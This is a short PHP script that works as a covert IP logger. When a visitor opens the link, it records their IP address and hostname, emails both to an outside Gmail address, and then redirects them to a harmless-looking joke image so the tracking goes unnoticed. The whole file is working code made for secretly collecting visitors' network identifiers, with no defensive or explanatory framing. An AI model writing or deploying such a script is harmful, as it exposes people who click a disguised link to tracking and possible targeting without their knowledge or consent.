?php
 
$IP = $_SERVER['REMOTE_ADDR'];
$HOST = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
$header = "IP-INFO@ANONYM.CZ";
 
mail("iphack1101@gmail.com", "IP von: ".$HOST."Diese Daten wurden mittels Php gesendet.
IP: ".$IP."
Host :".$HOST);
 
header('Location: http://allrights.nicobartes.com/facebook-sprueche/wp-content/uploads/2013/02/45-This-is-a-nudelholz.jpg');
exit();
 
 
?>